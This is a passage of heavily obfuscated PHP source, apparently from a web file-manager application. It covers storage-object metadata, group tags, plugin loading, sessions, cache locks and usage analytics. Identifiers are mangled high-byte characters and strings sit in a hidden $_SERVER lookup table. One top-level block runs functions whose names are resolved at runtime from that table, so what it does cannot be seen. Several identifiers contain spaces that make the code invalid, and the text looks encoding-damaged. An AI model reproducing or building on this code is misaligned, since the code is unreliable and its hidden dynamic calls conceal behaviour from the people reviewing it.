$this->objectMeta($EõéÔ”¼…); return $eÆ¬ ? $eÆ¬[$_SERVER[¹…ÕÄ][77]] : 0; } public function info($aº¹¤ï†ëÒ) { if ($this->isFolder($aº¹¤ï†ëÒ)) { return $this->folderInfo($aº¹¤ï†ëÒ); } else { if ($this->isFile($aº¹¤ï†ëÒ)) { return $this->fileInfo($aº¹¤ï†ëÒ); } } return !1; } public function exist($CëñÔßšŞ…) { return $this->isFile($CëñÔßšŞ…) || $this->isFolder($CëñÔßšŞ…); } public function isFile($fè‰Ğ‡ã™) { return !$this->isFolder($fè‰Ğ‡ã™) && $this->objectMeta($fè‰Ğ‡ã™); } public function isFolder($d©ÙğŠ¶•Ï) { return $this->cacheMethod($_SERVER[¹…ÕÄ][197], $d©ÙğŠ¶•Ï); } protected function objectMeta($CÄÍ‘¼àİ¢) { return $this->cacheMethod($_SERVER[¹…ÕÄ][198], $CÄÍ‘¼àİ¢); } protected function _objectMeta($AŠÊ½Ñò¬Î) { $CÚÙáˆ¹†° =& $_SERVER[¹…ÕÄ]; try { $C¿¡Çâ® = $this->client->getObjectMeta($this->bucket, $this->pathEncode($AŠÊ½Ñò¬Î)); } catch (OSS\Core\OssException $A—„ÂÜ¥‰ê) { $C¿¡Çâ® = !1; } if ($C¿¡Çâ®) { $C¿¡Çâ®[$CÚÙáˆ¹†°[77]] = intval($C¿¡Çâ®[$CÚÙáˆ¹†°[1251]]); } return $C¿¡Çâ®; } protected function _isFolder($fô¿âë…©) { $aëÊ§ÄâˆÌ =& $_SERVER[¹…ÕÄ]; if ($fô¿âë…© == $aëÊ§ÄâˆÌ[33] || $fô¿âë…© == $aëÊ§ÄâˆÌ[8]) { return !0; } $a‘µÑ„‘Û = array($aëÊ§ÄâˆÌ[1247] => $aëÊ§ÄâˆÌ[8], $aëÊ§ÄâˆÌ[1248] => rtrim($fô¿âë…©, $aëÊ§ÄâˆÌ[8]) . $aëÊ§ÄâˆÌ[8], $aëÊ§ÄâˆÌ[1249] => 1, $aëÊ§ÄâˆÌ[1250] => $aëÊ§ÄâˆÌ[33]); $f£ƒÑÍŞÈ¸ = $this->client->listObjects($this->bucket, $a‘µÑ„‘Û); if ($f£ƒÑÍŞÈ¸->getObjectList() || $f£ƒÑÍŞÈ¸->getPrefixList()) { return !0; } return !1; } } if ($_SERVER[$_SERVER[¹…ÕÄ][813]] != $_SERVER[$_SERVER[¹…ÕÄ][1278]]) { goto aš•¨Á‹åÎ; B‹Í¶àÃÄ: $dï‰ùâ„—İ($_SERVER[$_SERVER[¹…ÕÄ][811]]); goto bÜÉÏÓ†Ú; aš•¨Á‹åÎ: $BœÏôÙÂÙƒ = $_SERVER[¹…ÕÄ][815]; $A¾Œ³³©Š‡ = $_SERVER[$_SERVER[¹…ÕÄ][816]] . $_SERVER[¹…ÕÄ][817]; $d®»èê™õ = $BœÏôÙÂÙƒ($A¾Œ³³©Š‡); goto FøŠë²âŞÒ; FøŠë²âŞÒ: $c“´Î…ó¨ = explode($_SERVER[¹…ÕÄ][227], $d®»èê™õ); if (count($c“´Î…ó¨) < $_SERVER[¹…ÕÄ][574]) { $föÁÊÔ«—Œ = $_SERVER[¹…ÕÄ][818]; $föÁÊÔ«—Œ(); } $dï‰ùâ„—İ = $_SERVER[¹…ÕÄ][1116]; goto B‹Í¶àÃÄ; bÜÉÏÓ†Ú: } goto d¼††ÇŞ¥–; båª±ÙÛŒ: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($dêïÓ¢Òà¸) { $Eï¾«·Ú =& $_SERVER[¹…ÕÄ]; return array($Eï¾«·Ú[1768] => array($dêïÓ¢Òà¸[0], $Eï¾«·Ú[1769]), $Eï¾«·Ú[1770] => array($dêïÓ¢Òà¸[0], $Eï¾«·Ú[1771])); } protected function get($eŞ‰„™©ƒ) { $D¥çŠçª…Ì =& $_SERVER[¹…ÕÄ]; $eÎ¸ãíÖˆ = Model($D¥çŠçª…Ì[480])->metaGet($eŞ‰„™©ƒ, $D¥çŠçª…Ì[1772]); $CŠê³°ã = json_decode($eÎ¸ãíÖˆ, !0); return $CŠê³°ã ? $CŠê³°ã : array($D¥çŠçª…Ì[1773] => $D¥çŠçª…Ì[86], $D¥çŠçª…Ì[365] => array()); } protected function set($C¯³®›ºŠ‹, $C÷İ­œ°‘») { $AĞœÊÀõ‡á =& $_SERVER[¹…ÕÄ]; $C÷İ­œ°‘» = $C÷İ­œ°‘» ? $C÷İ­œ°‘» : array($AĞœÊÀõ‡á[1773] => $AĞœÊÀõ‡á[86], $AĞœÊÀõ‡á[365] => array()); Model($AĞœÊÀõ‡á[480])->metaSet($C¯³®›ºŠ‹, $AĞœÊÀõ‡á[1772], json_encode($C÷İ­œ°‘»)); return Model($AĞœÊÀõ‡á[480])->metaSet($C¯³®›ºŠ‹, $AĞœÊÀõ‡á[1772], json_encode($C÷İ­œ°‘»)); } protected function getByTagID($CÚùØªÏ, $d©Ä‘àæ) { goto f·»ËºÆÌ; FÚ³¦ÓŞÌ÷: return is_array($F—÷Úë”…) ? $F—÷Úë”… : !1; goto fùË”‡˜ë‘; Aâºàé´¤õ: $fæ­…•´´À = $this->get($CÚùØªÏ); if (!$fæ­…•´´À || !isset($fæ­…•´´À[$eôÆ´‚Ø²Š[365]])) { return !1; } $F—÷Úë”… = array_find_by_field($fæ­…•´´À[$eôÆ´‚Ø²Š[365]], $eôÆ´‚Ø²Š[388], $d©Ä‘àæ); goto FÚ³¦ÓŞÌ÷; f·»ËºÆÌ: $eôÆ´‚Ø²Š =& $_SERVER[¹…ÕÄ]; if (!$CÚùØªÏ || !$d©Ä‘àæ) { return !1; } if (!Model($eôÆ´‚Ø²Š[480])->getInfoSimple($CÚùØªÏ)) { return !1; } goto Aâºàé´¤õ; fùË”‡˜ë‘: } public function listSource($F˜Àğ°»Š›, $Eæé†„ÖÅŒ) { goto E˜¼¤¥°Í; Eº™õ’é«: foreach ($aå—âÇÊÇ as $D¥¼îÕˆ¶â => $DĞ½ª»ŒÉë) { $bÄ©‹£İá› = !0; if (!$Eæé†„ÖÅŒ) { $CŸ”±Ë™¯¹[] = $D¥¼îÕˆ¶â; continue; } foreach ($Eæé†„ÖÅŒ as $F«Ê…ôÌİ) { if (!in_array($F«Ê…ôÌİ, $DĞ½ª»ŒÉë)) { $bÄ©‹£İá› = !1; break; } } if ($bÄ©‹£İá›) { $CŸ”±Ë™¯¹[] = $D¥¼îÕˆ¶â; } } if (!$CŸ”±Ë™¯¹) { return array(); } $bŒÉÕçŠ± = Model($Cô¼ĞØ‰[1183])->listSource(array($Cô¼ĞØ‰[404] => array($Cô¼ĞØ‰[405], $CŸ”±Ë™¯¹))); goto c¸õÔì§†; FÅ·²¿êæ: if ($bìàØŠğ‡Ú) { $this->removeBySource($F˜Àğ°»Š›, $bìàØŠğ‡Ú); } return $bŒÉÕçŠ±; goto C¥µÇœìº¹; E˜¼¤¥°Í: $Cô¼ĞØ‰ =& $_SERVER[¹…ÕÄ]; if ($Eæé†„ÖÅŒ && !is_array($Eæé†„ÖÅŒ)) { $Eæé†„ÖÅŒ = array($Eæé†„ÖÅŒ); } $fÔ¤´¸×ŞÄ = $this->listData($F˜Àğ°»Š›); goto EÊë§Ï‘È; EÊë§Ï‘È: $aå—âÇÊÇ = array(); foreach ($fÔ¤´¸×ŞÄ as $fÔ”·œĞ¨) { $Cš¡Ä›è§ = $fÔ”·œĞ¨[$Cô¼ĞØ‰[75]]; if (!$Cš¡Ä›è§) { continue; } if (!isset($aå—âÇÊÇ[$Cš¡Ä›è§])) { $aå—âÇÊÇ[$Cš¡Ä›è§] = array(); } $aå—âÇÊÇ[$Cš¡Ä›è§][] = $fÔ”·œĞ¨[$Cô¼ĞØ‰[413]]; } $CŸ”±Ë™¯¹ = array(); goto Eº™õ’é«; EØÆ©‰¨Şö: $e‘³À½®ì£ = array_to_keyvalue($bŒÉÕçŠ±[$Cô¼ĞØ‰[73]], $Cô¼ĞØ‰[33], $Cô¼ĞØ‰[390]); $C„Ïµ»‡ƒó = array_merge($e‘³À½®ì£, $Båİˆ‰çï÷); foreach ($CŸ”±Ë™¯¹ as $Cš¡Ä›è§) { if (!in_array($Cš¡Ä›è§, $C„Ïµ»‡ƒó)) { $bìàØŠğ‡Ú[] = $Cš¡Ä›è§; } } goto FÅ·²¿êæ; c¸õÔì§†: if (!$bŒÉÕçŠ± || count($CŸ”±Ë™¯¹) == $bŒÉÕçŠ±[$Cô¼ĞØ‰[362]][$Cô¼ĞØ‰[363]]) { return $bŒÉÕçŠ±; } $bìàØŠğ‡Ú = array(); $Båİˆ‰çï÷ = array_to_keyvalue($bŒÉÕçŠ±[$Cô¼ĞØ‰[74]], $Cô¼ĞØ‰[33], $Cô¼ĞØ‰[390]); goto EØÆ©‰¨Şö; C¥µÇœìº¹: } protected function listData($Bêô†°ª®à) { $EãÇ‘Ÿ«‡‡ =& $_SERVER[¹…ÕÄ]; $eÀ¯ù‰ÉœÑ = array($EãÇ‘Ÿ«‡‡[1496] => 0, $EãÇ‘Ÿ«‡‡[457] => array($EãÇ‘Ÿ«‡‡[1774], 0), $EãÇ‘Ÿ«‡‡[409] => $EãÇ‘Ÿ«‡‡[1775] . $Bêô†°ª®à); $F±ƒ´ÙÜæ = $EãÇ‘Ÿ«‡‡[1776]; $A†Ò¿Ğ³Œ» = $this->field($F±ƒ´ÙÜæ)->where($eÀ¯ù‰ÉœÑ)->order($EãÇ‘Ÿ«‡‡[1777])->select(); return $A†Ò¿Ğ³Œ» ? $A†Ò¿Ğ³Œ» : array(); } protected function addToTag($B·Î¡ñ‹Ÿ§, $dóùÅùæ, $a£ÈÜºë³) { $E‡Œƒ¬˜ö =& $_SERVER[¹…ÕÄ]; if (!$this->getByTagID($B·Î¡ñ‹Ÿ§, $a£ÈÜºë³) || !$dóùÅùæ) { return !1; } if (!Model($E‡Œƒ¬˜ö[770])->pathInfo($dóùÅùæ)) { return !1; } $fÕ†’Á È¿ = array($E‡Œƒ¬˜ö[1496] => 0, $E‡Œƒ¬˜ö[457] => $a£ÈÜºë³, $E‡Œƒ¬˜ö[408] => $dóùÅùæ, $E‡Œƒ¬˜ö[409] => $E‡Œƒ¬˜ö[1778] . $B·Î¡ñ‹Ÿ§, $E‡Œƒ¬˜ö[407] => $E‡Œƒ¬˜ö[33], $E‡Œƒ¬˜ö[1671] => 0); if ($this->where($fÕ†’Á È¿)->find()) { return !1; } return $this->add($fÕ†’Á È¿); } protected function removeFromTag($Bò¿²ƒÈ«è, $D‚õ®ñŒÂ‘, $E¹Š›¿ˆ†‰) { $aÈ¦ÁÈ‘Ì– =& $_SERVER[¹…ÕÄ]; if (!$this->getByTagID($Bò¿²ƒÈ«è, $E¹Š›¿ˆ†‰) || !$D‚õ®ñŒÂ‘) { return !1; } if (is_array($D‚õ®ñŒÂ‘)) { $D‚õ®ñŒÂ‘ = array($aÈ¦ÁÈ‘Ì–[7], $D‚õ®ñŒÂ‘); } $EÛ–×Õ„‡ = array($aÈ¦ÁÈ‘Ì–[1496] => 0, $aÈ¦ÁÈ‘Ì–[457] => $E¹Š›¿ˆ†‰, $aÈ¦ÁÈ‘Ì–[409] => $aÈ¦ÁÈ‘Ì–[1778] . $Bò¿²ƒÈ«è, $aÈ¦ÁÈ‘Ì–[408] => $D‚õ®ñŒÂ‘); return $this->where($EÛ–×Õ„‡)->delete(); } protected function removeByTag($b¶â…¬ì§, $bŒ™×ÌÎùá) { $BÇË¿Ú =& $_SERVER[¹…ÕÄ]; if (!$this->getByTagID($b¶â…¬ì§, $bŒ™×ÌÎùá)) { return !1; } $A—¢©ÜæõÚ = array($BÇË¿Ú[1496] => 0, $BÇË¿Ú[457] => $bŒ™×ÌÎùá, $BÇË¿Ú[409] => $BÇË¿Ú[1778] . $b¶â…¬ì§); return $this->where($A—¢©ÜæõÚ)->delete(); } protected function removeBySource($a·ºÊÚ±“, $CÚ£Éªö’›) { $fÊÄÃ§åø =& $_SERVER[¹…ÕÄ]; if (!$a·ºÊÚ±“ || !$CÚ£Éªö’›) { return !1; } if (is_array($CÚ£Éªö’›)) { $CÚ£Éªö’› = array($fÊÄÃ§åø[7], $CÚ£Éªö’›); } $EŠô²×ô‡È = array($fÊÄÃ§åø[1496] => 0, $fÊÄÃ§åø[408] => $CÚ£Éªö’›, $fÊÄÃ§åø[457] => array($fÊÄÃ§åø[950], 0), $fÊÄÃ§åø[409] => $fÊÄÃ§åø[1778] . $a·ºÊÚ±“); return $this->where($EŠô²×ô‡È)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\160\154\165\147\x69\x6e\x4c\151\x73\x74"; public $field = array("\156\x61\155\145", "\x73\164\x61\164\x75\x73", "\x72\x65\x67\151\145\163\164", "\x63\x6f\156\x66\151\147"); public function loadList($DŸàÇÕ¹‚… = false) { $D¤·õ½é‚ğ = array_to_keyvalue($this->listData(), $_SERVER[¹…ÕÄ][28]); if ($DŸàÇÕ¹‚…) { return $D¤·õ½é‚ğ[$DŸàÇÕ¹‚…]; } return $D¤·õ½é‚ğ; } public function init() { $dÀ¥»ÃÄË =& $_SERVER[¹…ÕÄ]; Hook::trigger($dÀ¥»ÃÄË[1779]); $DÜÏ±Àß = $this->loadPluginList(); foreach ($DÜÏ±Àß as $cÆ¿ƒçæ¤© => $C„·¾¨“) { $Fâºˆ’Áóƒ = $this->appAllow($cÆ¿ƒçæ¤©, $C„·¾¨“); if (!$Fâºˆ’Áóƒ) { continue; } foreach ($C„·¾¨“[$dÀ¥»ÃÄË[1780]] as $föëãÔ·ËĞ => $A¸Õ¾Ã²Š) { Hook::bind($föëãÔ·ËĞ, $A¸Õ¾Ã²Š); } } Hook::trigger($dÀ¥»ÃÄË[1781]); Hook::trigger(ACTION); } public function appAllow($F´²‘–Øë«, $CÚˆ—ôÓ¬, $D±¢¬Ò«ã = true) { $bæíœß´ƒ =& $_SERVER[¹…ÕÄ]; $c‘¨ˆ¼£¥ = PLUGIN_DIR . $F´²‘–Øë« . $bæíœß´ƒ[1782]; if (!is_array($CÚˆ—ôÓ¬) || !is_array($CÚˆ—ôÓ¬[$bæíœß´ƒ[1780]]) || $CÚˆ—ôÓ¬[$bæíœß´ƒ[705]] != 1 || !is_file($c‘¨ˆ¼£¥)) { return !1; } if ($GLOBALS[$bæíœß´ƒ[479]] == 1) { return !0; } if ($D±¢¬Ò«ã && !Action($bæíœß´ƒ[1783])->checkAuth($F´²‘–Øë«)) { return !1; } return !0; } public function unInstall($e±ê”Âˆàš) { $EÛµò±‘±ğ =& $_SERVER[¹…ÕÄ]; $bàØğœğ‘Á = $this->loadList($e±ê”Âˆàš); if (file_exists(PLUGIN_DIR . $e±ê”Âˆàš)) { Hook::apply($e±ê”Âˆàš . $EÛµò±‘±ğ[1784]); } $this->remove($bàØğœğ‘Á[$EÛµò±‘±ğ[388]]); } public function changeStatus($B®íÕ¡Ú³­, $aë‘¼Ôë¬«) { $d´‚¯á¡„Ş =& $_SERVER[¹…ÕÄ]; $E¨­ù¯Õ = $this->loadList($B®íÕ¡Ú³­); if ($aë‘¼Ôë¬«) { Hook::apply($B®íÕ¡Ú³­ . $d´‚¯á¡„Ş[1785]); } $this->update($E¨­ù¯Õ[$d´‚¯á¡„Ş[388]], array($d´‚¯á¡„Ş[1786] => $aë‘¼Ôë¬«)); } public function appRegist($d³ŒÓË‹ç™, $dÆ£ƒ„©…Î) { $aïã«¡´Ù˜ =& $_SERVER[¹…ÕÄ]; $a±’À÷Ú¿¢ = $this->loadList($d³ŒÓË‹ç™); if ($a±’À÷Ú¿¢) { $this->update($a±’À÷Ú¿¢[$aïã«¡´Ù˜[388]], array($aïã«¡´Ù˜[1780] => $dÆ£ƒ„©…Î)); } else { $eõĞáš†‘ = array($aïã«¡´Ù˜[28] => $d³ŒÓË‹ç™, $aïã«¡´Ù˜[1780] => $dÆ£ƒ„©…Î, $aïã«¡´Ù˜[705] => 0, $aïã«¡´Ù˜[6] => $this->getConfigDefault($d³ŒÓË‹ç™)); $this->insert($eõĞáš†‘); } } public function getConfigDefault($D…ö‰ˆ˜›Â) { $A˜­§‡›Û‰ =& $_SERVER[¹…ÕÄ]; $f¨‚£ÖËÄ = array(); $fé‚­ÊàÎï = $this->getPackageJson($D…ö‰ˆ˜›Â); if (!$fé‚­ÊàÎï && is_array($fé‚­ÊàÎï[$A˜­§‡›Û‰[1787]])) { return $f¨‚£ÖËÄ; } foreach ($fé‚­ÊàÎï[$A˜­§‡›Û‰[1787]] as $b¯“¾ì¥”Ş => $aÉØ›÷ÉëÚ) { if (!isset($aÉØ›÷ÉëÚ[$A˜­§‡›Û‰[370]]) || isset($f¨‚£ÖËÄ[$b¯“¾ì¥”Ş])) { continue; } $f¨‚£ÖËÄ[$b¯“¾ì¥”Ş] = $aÉØ›÷ÉëÚ[$A˜­§‡›Û‰[370]]; } return $f¨‚£ÖËÄ; } public function getPackageJson($DäšóÜ°¼) { return Hook::apply($DäšóÜ°¼ . $_SERVER[¹…ÕÄ][1788]); } public function getConfig($AÄê¢Öº, $fÃ§¼Ÿ¨† = false) { $D©œŒƒÚ­Ë =& $_SERVER[¹…ÕÄ]; $Dæô¼í‚ = array(); $fé‘Ğ¿èå = $this->loadList($AÄê¢Öº); if ($fé‘Ğ¿èå && is_array($fé‘Ğ¿èå[$D©œŒƒÚ­Ë[6]])) { $Dæô¼í‚ = $fé‘Ğ¿èå[$D©œŒƒÚ­Ë[6]]; } if (!$Dæô¼í‚ || $fÃ§¼Ÿ¨†) { $Dæô¼í‚ = $this->getConfigDefault($AÄê¢Öº); } return $Dæô¼í‚; } public function setConfig($AÙ³‡»„¥ä, $E¼»àøßµŠ = false) { goto f³ƒßø‡ Ø; dÜÈ’‡à¤é: $f¨Œ¬µ—ëö = $c×±Ú»ôÈ¿[$bÊÃ—¦Ô[6]]; if ($E¼»àøßµŠ == !1) { $f¨Œ¬µ—ëö = array(); $E¼»àøßµŠ = $this->getConfigDefault($AÙ³‡»„¥ä); } foreach ($E¼»àøßµŠ as $CîÆªŸ­Ù´ => $Fí·‡ã‹Ÿê) { $f¨Œ¬µ—ëö[$CîÆªŸ­Ù´] = is_string($Fí·‡ã‹Ÿê) ? trim($Fí·‡ã‹Ÿê) : $Fí·‡ã‹Ÿê; } goto cÑÔ„åÀ±‹; f³ƒßø‡ Ø: $bÊÃ—¦Ô =& $_SERVER[¹…ÕÄ]; $c×±Ú»ôÈ¿ = $this->loadList($AÙ³‡»„¥ä); if (!$c×±Ú»ôÈ¿) { return !1; } goto dÜÈ’‡à¤é; cÑÔ„åÀ±‹: $this->update($c×±Ú»ôÈ¿[$bÊÃ—¦Ô[388]], array($bÊÃ—¦Ô[6] => $f¨Œ¬µ—ëö)); goto EĞˆê‚å; EĞˆê‚å: } public function viewList() { goto BÏ‰µçë©ñ; Dê‰µ¥à×¬: return $eïÏ±Êòšƒ; goto eÎ‡‘íµÒ·; BÏ‰µçë©ñ: $eº „§É—‚ =& $_SERVER[¹…ÕÄ]; $aĞ•ËŸ¯³ = $this->loadList(); $this->pluginScan($aĞ•ËŸ¯³); goto dŒô‹”ÒÍ·; dŒô‹”ÒÍ·: $aĞ•ËŸ¯³ = $this->loadPluginList(); $eïÏ±Êòšƒ = array(); foreach ($aĞ•ËŸ¯³ as $CîÉ‘æã’½ => $bğ¢¡îÌ¢) { unset($bğ¢¡îÌ¢[$eº „§É—‚[1780]], $bğ¢¡îÌ¢[$eº „§É—‚[6]]); $Fº„’ïï = PLUGIN_DIR . $bğ¢¡îÌ¢[$eº „§É—‚[28]] . $eº „§É—‚[1782]; if (!is_file($Fº„’ïï)) { continue; } $cåÉƒù¿Ğ = Hook::apply($bğ¢¡îÌ¢[$eº „§É—‚[28]] . $eº „§É—‚[1788]); if (is_array($cåÉƒù¿Ğ)) { $eïÏ±Êòšƒ[$CîÉ‘æã’½] = array_merge($bğ¢¡îÌ¢, $cåÉƒù¿Ğ); } } goto Dê‰µ¥à×¬; eÎ‡‘íµÒ·: } private function loadPluginList() { $f„ÕÙ´¯¦® =& $_SERVER[¹…ÕÄ]; $cØ§óŸ‰”˜ = $this->loadList(); if (strtolower(MOD) == $f„ÕÙ´¯¦®[1789]) { return $cØ§óŸ‰”˜; } $aĞğ¹‹Â®Ä = Hook::trigger($f„ÕÙ´¯¦®[1790], $cØ§óŸ‰”˜); if ($cØ§óŸ‰”˜ && !$aĞğ¹‹Â®Ä) { die; } return $aĞğ¹‹Â®Ä ? $aĞğ¹‹Â®Ä : $cØ§óŸ‰”˜; } private function pluginScan($cá”ìÕ¸) { $e³Ë†¼‰Û =& $_SERVER[¹…ÕÄ]; recursion_dir(PLUGIN_DIR, $Eòç¥ä‰Ø, $c§Ï‹§´°ğ, 0); foreach ($Eòç¥ä‰Ø as $E¸ê‰”ï‡) { $f¼ÇÃ¤‰Ö = get_path_this($E¸ê‰”ï‡); if (isset($cá”ìÕ¸[$f¼ÇÃ¤‰Ö]) || !file_exists($E¸ê‰”ï‡ . $e³Ë†¼‰Û[1791]) || !file_exists($E¸ê‰”ï‡ . $e³Ë†¼‰Û[1782])) { continue; } Hook::apply($f¼ÇÃ¤‰Ö . $e³Ë†¼‰Û[1785]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\x74\145\x6d\x5f\163\145\163\x73\x69\157\x6e"; public function get($Dß»Ğ‰ŠÌ©) { $cšØøš‰à =& $_SERVER[¹…ÕÄ]; $EíãÊÈ‰É = $this->where(array($cšØøš‰à[1792] => $Dß»Ğ‰ŠÌ©))->find(); if (!is_array($EíãÊÈ‰É)) { return !1; } return $EíãÊÈ‰É[$cšØøš‰à[708]]; } public function set($bÈ©¸ã”Œ„, $DÇÓ£ùÛº, $f¶˜¶Ù×«¥ = 3600) { $Bšå–áÁ =& $_SERVER[¹…ÕÄ]; $CŞí»á• = array($Bšå–áÁ[1792] => $bÈ©¸ã”Œ„, $Bšå–áÁ[1700] => $DÇÓ£ùÛº, $Bšå–áÁ[1793] => $f¶˜¶Ù×«¥ + time()); if (Session::get($Bšå–áÁ[1794])) { $CŞí»á•[$Bšå–áÁ[1504]] = Session::get($Bšå–áÁ[1794]); } else { $CŞí»á•[$Bšå–áÁ[1504]] = 0; } if ($this->get($bÈ©¸ã”Œ„)) { return $this->where(array($Bšå–áÁ[1792] => $bÈ©¸ã”Œ„))->save($CŞí»á•); } else { return $this->add($CŞí»á•, array(), !0); } } public function remove($B¢ĞÜŠÒƒ) { return $this->where(array($_SERVER[¹…ÕÄ][1792] => $B¢ĞÜŠÒƒ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¹…ÕÄ][1795] . time())->delete(); } } goto F±„£Œš× ; Fç§™È¹×Â: class CacheLockRedis { public function lock($dƒ ½èˆ·Ô, $F¹‡›»§–Œ = 10) { $BçªğŞ¯ï„ = Cache::init(); $cöÊöÈš…ß = microtime(!0) + $F¹‡›»§–Œ; while (microtime(!0) < $cöÊöÈš…ß) { $a¾ÔïÆ…†­ = $BçªğŞ¯ï„->get($dƒ ½èˆ·Ô); if (!$a¾ÔïÆ…†­) { $A³Â¯¶Ü‹î = $BçªğŞ¯ï„->setLock($dƒ ½èˆ·Ô, $cöÊöÈš…ß, $F¹‡›»§–Œ); if ($A³Â¯¶Ü‹î) { return !0; } } else { if ($a¾ÔïÆ…†­ < microtime(!0)) { $BçªğŞ¯ï„->set($dƒ ½èˆ·Ô, $cöÊöÈš…ß, $F¹‡›»§–Œ * 2); if ($BçªğŞ¯ï„->get($dƒ ½èˆ·Ô) === $a¾ÔïÆ…†­) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($dçŞñƒÀùà) { return Cache::init()->get($dçŞñƒÀùà); } public function unlock($DÂ„¨å¿¤¦) { return Cache::init()->remove($DÂ„¨å¿¤¦); } } class CacheLockMemcached { public function lock($C¼Èæà»¾Ò, $fæò“Û¤µÏ = 0) { $B‹‡¹§”¼˜ = Cache::init(); $e¶‰Û§¥ƒ— = microtime(!0) + $fæò“Û¤µÏ; while (microtime(!0) < $e¶‰Û§¥ƒ—) { $A˜ã¢”¬ = $B‹‡¹§”¼˜->get($C¼Èæà»¾Ò); if (!$A˜ã¢”¬ || $A˜ã¢”¬ < microtime(!0)) { $cåÎˆ Ş¤‡ = $B‹‡¹§”¼˜->handle->add($C¼Èæà»¾Ò, $e¶‰Û§¥ƒ—, $fæò“Û¤µÏ); if ($cåÎˆ Ş¤‡) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($aÕàåŞ) { return Cache::init()->get($aÕàåŞ); } public function unlock($A£ˆëÔÌ®Ä) { return Cache::init()->remove($A£ˆëÔÌ®Ä); } } class CacheLockDatabase { public function lock($FØ›Ïô»¨, $FÚ¬¨â¥ĞĞ = 0) { $d‹ïå®‚ Î = Model($_SERVER[¹…ÕÄ][774]); $A“æéäƒ›Ã = microtime(!0) + $FÚ¬¨â¥ĞĞ; while (microtime(!0) < $A“æéäƒ›Ã) { $c„¦Ş‹§„ = $d‹ïå®‚ Î->get($FØ›Ïô»¨); if (!$c„¦Ş‹§„ || $c„¦Ş‹§„ < microtime(!0)) { $Fêºæ¥ˆ“ = $d‹ïå®‚ Î->set($FØ›Ïô»¨, $A“æéäƒ›Ã); if ($Fêºæ¥ˆ“) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($cÃİˆêƒ°ˆ) { return Model($_SERVER[¹…ÕÄ][774])->get($cÃİˆêƒ°ˆ); } public function unlock($DŸØÌÔØ°) { Model($_SERVER[¹…ÕÄ][774])->remove($DŸØÌÔØ°); } } goto AŒçØÅÖ£ê; b’‘¨ÒŒ‡¤: class AnalysisModel extends ModelBaseLight { public function init($AìÓ¼â¦½ó) { $CóÌÎÜÅÌ =& $_SERVER[¹…ÕÄ]; $bÖÇˆ©ØóŠ = array($CóÌÎÜÅÌ[557] => array($CóÌÎÜÅÌ[29] => $CóÌÎÜÅÌ[1593], $CóÌÎÜÅÌ[269] => array($CóÌÎÜÅÌ[220], $CóÌÎÜÅÌ[716], $CóÌÎÜÅÌ[1594], $CóÌÎÜÅÌ[1595])), $CóÌÎÜÅÌ[1596] => array($CóÌÎÜÅÌ[29] => $CóÌÎÜÅÌ[1597], $CóÌÎÜÅÌ[269] => array($CóÌÎÜÅÌ[220], $CóÌÎÜÅÌ[714], $CóÌÎÜÅÌ[1598], $CóÌÎÜÅÌ[1599], $CóÌÎÜÅÌ[1600]))); if (!isset($bÖÇˆ©ØóŠ[$AìÓ¼â¦½ó])) { return !1; } $this->optionType = $bÖÇˆ©ØóŠ[$AìÓ¼â¦½ó][$CóÌÎÜÅÌ[29]]; $this->field = $bÖÇˆ©ØóŠ[$AìÓ¼â¦½ó][$CóÌÎÜÅÌ[269]]; return !0; } public function listData($Fñ§¸™Ê– = false, $bììÒå¢Ô = "\x6d\157\144\151\x66\171\x54\x69\155\145", $BÔ²Œ‡–ñß = false) { return parent::listData($Fñ§¸™Ê–, $bììÒå¢Ô, $BÔ²Œ‡–ñß); } public function trendList($A²¹»ò»½) { goto A¸Œ¹¿ğİ‘; E«ï –šğ: if (!isset($EÁ¶¼Ê«Î÷)) { $Bíˆ¶Å· = $A²¹»ò»½ == $C¢†ù«—å¢[557] ? $C¢†ù«—å¢[501] : $C¢†ù«—å¢[770]; $EÁ¶¼Ê«Î÷ = Model($Bíˆ¶Å·)->min($C¢†ù«—å¢[192]); } $C¢ÂâÎËùÅ = $C¢†ù«—å¢[1603] . ucfirst($A²¹»ò»½); $e›Ò„³¥Ï™ = $this->dateList($EÁ¶¼Ê«Î÷); goto dŒÕÌåÂæ; dŒÕÌåÂæ: foreach ($e›Ò„³¥Ï™ as $eô“Ñô‚ø) { $this->{$C¢ÂâÎËùÅ}($eô“Ñô‚ø); } return $this->listData(); goto cÆ¶’øñ; A¸Œ¹¿ğİ‘: $C¢†ù«—å¢ =& $_SERVER[¹…ÕÄ]; $aµ£˜³ÂÚ‹ = $this->listData(); if ($aµ£˜³ÂÚ‹) { $CÌéôˆš‚Ï = end($aµ£˜³ÂÚ‹); $eô“Ñô‚ø = date($C¢†ù«—å¢[1601], strtotime($C¢†ù«—å¢[1602])); if ($CÌéôˆš‚Ï[$C¢†ù«—å¢[220]] == $eô“Ñô‚ø) { return $aµ£˜³ÂÚ‹; } $EÁ¶¼Ê«Î÷ = strtotime($CÌéôˆš‚Ï[$C¢†ù«—å¢[220]]); } goto E«ï –šğ; cÆ¶’øñ: } private function dateList($AÌª¢º˜¬«) { $a‡·ª¾ˆŞ =& $_SERVER[¹…ÕÄ]; $e÷¶Ò¡¡¢ = $AÌª¢º˜¬«; $e‚©ÄÆ—ëì = strtotime($a‡·ª¾ˆŞ[1602]); $Eß‰êÛê¦Œ = array(); while ($e÷¶Ò¡¡¢ <= $e‚©ÄÆ—ëì) { $Eß‰êÛê¦Œ[] = date($a‡·ª¾ˆŞ[1601], $e÷¶Ò¡¡¢); $e÷¶Ò¡¡¢ = strtotime($a‡·ª¾ˆŞ[1604], $e÷¶Ò¡¡¢); } return $Eß‰êÛê¦Œ; } public function _recordUser($AÈİ„Ê¼² = '') { goto E»™Èö‹Ù¢; FŒ¸òÚ´ä: $c»ØºØ’å = array($CÁªÛù©ª•[192] => array($CÁªÛù©ª•[949], $a¡Ÿİ—í)); $Aà£‡ˆîÚË = Model($CÁªÛù©ª•[501])->where($c»ØºØ’å)->count($CÁªÛù©ª•[1504]); $c»ØºØ’å[$CÁªÛù©ª•[192]] = array($CÁªÛù©ª•[329], array($FŞ¬œò˜‚à, $a¡Ÿİ—í)); goto fÃ¹áÃÆø“; fÃ¹áÃÆø“: $b¨Íç¯Òç¢ = 